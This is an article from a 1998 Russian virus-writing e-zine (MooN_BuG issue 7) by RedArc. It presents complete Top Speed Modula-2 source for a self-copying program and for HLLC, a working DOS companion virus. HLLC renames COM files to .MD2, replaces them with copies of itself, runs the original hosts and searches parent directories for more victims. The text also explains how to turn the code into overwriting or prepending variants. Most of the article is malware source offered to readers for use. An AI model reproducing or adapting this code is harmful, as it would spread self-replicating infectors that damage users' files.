[TulaAnti&ViralClub] PRESENTS ...
MooN_BuG, Issue 7, Sep 1998                                           file 009

                          HLL на Top Speed Modula-2
                                                     by RedArc

     Вот  захотелось  мне  вдруг  вспомнить  старые  добрые времена, когда еще
компьютеры  были  слабыми, а языки программирования были гибкими... То есть то
время,  когда  я осваивал классный такой язык высокого уровня, созданный самим
Виртом  (ну  зачем  Borland  его испохабил в виде своей реализации Pascal'а?).
Этот  классный язык называется Top Speed Modula-2. Разумеется, что с той поры,
когда  был  написан  компилятор  (который  я вытащил с запыленной пятидюймовой
дискеты, хранящейся у меня в той коробке, где валяется всякая дрянь, которую я
так  и  не  смог  себя  заставить  выкинуть)  прошло  уже  не  мало  времени и
сегодняшняя  Modula стала в тысячу раз круче, но по ряду обстоятельств не пишу
я  на  ней...  Дык  вот, достал я старенький компилятор от старенькой Modula и
решил  написать  чего-нибудь эдакое, чего раньше на этом языке не писал. Решил
забацать  короче  вирусок.  Для  прикола  инфицирующий  COM-программы  методом
Companion... Дык вот, получилось у меня это дело... ;)
     Мне  так кажется, что я первый этот компилятор приспособил для сего столь
интересного дела... Дык вот, что во всей этой статье самое главное ;)
     Значит,  по  порядку.  Сначала  приведу не совсем вирус, вернее совсем не
вирус. Эта программа занимается вот чем:

1) Ищет свое имя в DOS Environment
2) Генерирует случайное имя EXE-файла, еще не существующего в текущем
   каталоге
3) Копирует собственное тело в файл с этим случайно сгенерированным именем.

     Т.е.  как вы понимаете, до вируса - один шаг: вместо генерации случайного
имени  нужно  сделать  поиск  по  шаблону  и  проверку на присутствие вируса в
найденном  файле, копирование части жертвы в конец файла и запись собственного
тела  в  начало  (это  если  HLLP).  Да,  еще  нужно  сделать запуск жертвы на
исполнение.
     Если  же делать оверврайтинг, то нужно лишь заменить генерацию случайного
имени на поиск файлов по шаблону.
     Если  же  делать спутник, то нужно заменить генерацию случайного имени на
поиск файлов по шаблону и запуск жертвы на исполнение.

=== Cut ===                                                            HLL.EXE
(* (c) 1998 by RedArc // TAVC *)

MODULE HLL;

FROM FIO IMPORT File, Exists, Close, BufferOverhead, Open, Create, RdBin, WrBin;
FROM Lib IMPORT RANDOM, RANDOMIZE;
FROM Str IMPORT IntToStr, Append, Delete, Pos, Length;
FROM AsmLib IMPORT Environment, CommandType;

CONST
    MyLength = 14332;

TYPE
   STRING = ARRAY [0..255] OF CHAR;

VAR
    F, F1 : File;
    P     : ADDRESS;
    W, W1 : LONGINT;
    Nam  : STRING;
    Name : STRING;

PROCEDURE RandomName (VAR S : STRING);
VAR
   L : LONGINT;
   I, J : LONGINT;
   C : STRING;
   Res : BOOLEAN;
LABEL
    Break;
BEGIN
     REPEAT
        L := LONGINT(1 + RANDOM (8));
        S := '';
        FOR I := 1 TO L DO
            J := 0;
            WHILE (J < 65) OR (J > 90) DO
                  J := LONGINT(1 + RANDOM (90));
            END;
            C := STRING(CHR (J));
            Append (S, C);
        END;
        Append (S, '.EXE');
        IF Exists (S) = FALSE THEN  GOTO Break END;
     UNTIL FALSE;
Break:
END RandomName;

CONST
    Size = MyLength + BufferOverhead;
VAR
    Buffer : ARRAY [1..Size] OF BYTE;
    Count  : CARDINAL;
    Poi    : CommandType;
    I, J   : INTEGER;
    Ch     : CHAR;
BEGIN
      RANDOMIZE;
      FOR I := 1 TO 1000 DO
      Poi := Environment (I);
      Nam := STRING(Poi^);
      END;
      I := 3;
      Name := '';
      REPEAT
      Ch := Nam [I];
      Append (Name, Ch);
      I := I + 1;
      UNTIL Ch = CHR (0H);
      F := Open (Name);
      RandomName (Name);
      F1 := Create (Name);
      Count := RdBin (F, Buffer, MyLength);
      WrBin (F1, Buffer, MyLength);
      Close (F1);
      Close (F);
END HLL.
=== Cut ===

     А  вот теперь и сам вирус. Вирус выделяет 65535 байт памяти и запускает в
этом  участке  программу-жертву.  Поиск осуществляется в текущем каталоге и во
всех  родительских  каталогах  по  вложенности. Ищет COM-файлы с нормальными и
архивными атрибутами. Дальше проверяется для найденного файла нахождение в том
же  каталоге  файла  с  тем  же  именем,  но  с  расширением  '.MD2' и при его
отсутствии  производится  собственно  инфицирование.  Инфицирование происходит
тривиальным  порядком:  найденный  файл переименовывается в файл с расширением
'.MD2' а с его именем и его расширением '.COM' создается новый файл, в который
копируется  код  из  файла, из которого был произведен запуск вируса. При этом
ведется  счетчик  инфицированных  файлов.  Если  счетчик  по  окончанию работы
становится  равен  13, то вирус выводит рекламный текст. Вот собственно и все.
Лечится  он  простым  прибивание *.COM файлов и переименованием всех файлов из
*.MD2 в *.COM

=== Cut ===                                                           HLLC.EXE
(******************************)
(* Компаньон для COM-программ *)
(* 1998 (c) by RedArc // TAVC *)
(******************************)

MODULE HLLC;

FROM FIO IMPORT File, Exists, Close, BufferOverhead, Open, Create, RdBin, WrBin;
FROM FIO IMPORT DirEntry, GetDir, ReadFirstEntry, FileAttr, archive, Rename;
FROM FIO IMPORT ReadNextEntry, ChDir, IOcheck;
FROM IO  IMPORT WrStr;
FROM Lib IMPORT Execute;
FROM Str IMPORT Append, Delete, Pos, Length, Copy;
FROM AsmLib IMPORT Environment, CommandType, ParamCount, ParamStr;
FROM Storage IMPORT ALLOCATE, DEALLOCATE;

CONST
    MyLength = 18287;

TYPE
   STRING = ARRAY [0..255] OF CHAR;
   OneParam = ARRAY [1..80] OF CHAR;

VAR
    F, F1 : File;
    P     : ADDRESS;
    W, W1 : LONGINT;
    Nam  : STRING;
    Name : STRING;
    CouPar : CARDINAL;
    MyPar  : ARRAY [1..40] OF OneParam;
    Parm   : OneParam;
    BossName : STRING;

CONST
    Size = MyLength + BufferOverhead;
    BossSize = 65535;

VAR
    Buffer : ARRAY [1..Size] OF BYTE;
    Count  : CARDINAL;
    Poi    : CommandType;
    I, J   : INTEGER;
    Ch     : CHAR;
    Ref    : ADDRESS;
    Rep    : CARDINAL;
    HomeDir: STRING;
    CurDir : STRING;
    Entry  : DirEntry;
    CouFile: CARDINAL;
    RepB   : BOOLEAN;
LABEL
      Lab1, Lab2;
BEGIN
      CouFile := 0;
      Name := '';
      FOR I := 1 TO 1000 DO
      Poi := Environment (I);
      Nam := STRING(Poi^);
      END;
      I := 3;
      REPEAT
      Ch := Nam [I];
      Append (Name, Ch);
      I := I + 1;
      UNTIL Ch = CHR (0H);

      Parm := '';
      FOR I := 1 TO ParamCount() DO
          ParamStr (MyPar [I], I);
          Append (Parm, MyPar [I]);
          Append (Parm, ' ');
      END;
      BossName := Name;
      Delete (BossName, Length (BossName) - 4, 4);
      Append (BossName, '.MD2');
      ALLOCATE (Ref, BossSize);
      Rep := Execute (BossName, Parm, Ref, BossSize DIV 16);
      DEALLOCATE (Ref, BossSize);

      GetDir (0, HomeDir);
      FOR J := 1 TO 5 DO
          CurDir := '*.COM';
          RepB := ReadFirstEntry (CurDir, FileAttr{archive}, Entry);
          WHILE RepB DO
                Copy (BossName,Entry.Name);
                Delete (BossName, Length (BossName) - 4, 4);
                Append (BossName, '.MD2');
                IF Exists (BossName) THEN
                   GOTO Lab1
                END;
                Rename (Entry.Name, BossName);
                F1 := Create (Entry.Name);
                F  := Open (Name);
                Count := RdBin (F, Buffer, MyLength);
                WrBin (F1, Buffer, MyLength);
                Close (F);
                Close (F1);
                CouFile := CouFile + 1;
Lab1:
                RepB := ReadNextEntry (Entry);
          END;
          GetDir (0, CurDir);
          IF CurDir [0] = CHR (0) THEN
             GOTO Lab2
          END;
          REPEAT
                 Ch := CurDir [Length (CurDir)-1];
                 CurDir [Length (CurDir)-1] := CHR (0);
          UNTIL (Ch = '\') OR (Length (CurDir) = 0);
          Copy (Nam, Name);
          Delete (Nam, 3, Length (Nam) - 3);
          Append (Nam, CurDir);
          ChDir (Nam);
      END;
Lab2:
      Delete (Name, 3, Length (Name) - 3);
      Append (Name, HomeDir);
      ChDir (Name);
      IF CouFile = 13 THEN
         WrStr ('');
         WrStr ('HLLC-virus for COM-Programms');
         WrStr ('Make of Top Speed Modula-2');
         WrStr ('1998 (c) by RedArc // TAVC');
         WrStr ('Special Realize for MooN BuG issue 7');
         WrStr ('');
      END;
END HLLC.
=== Cut ===
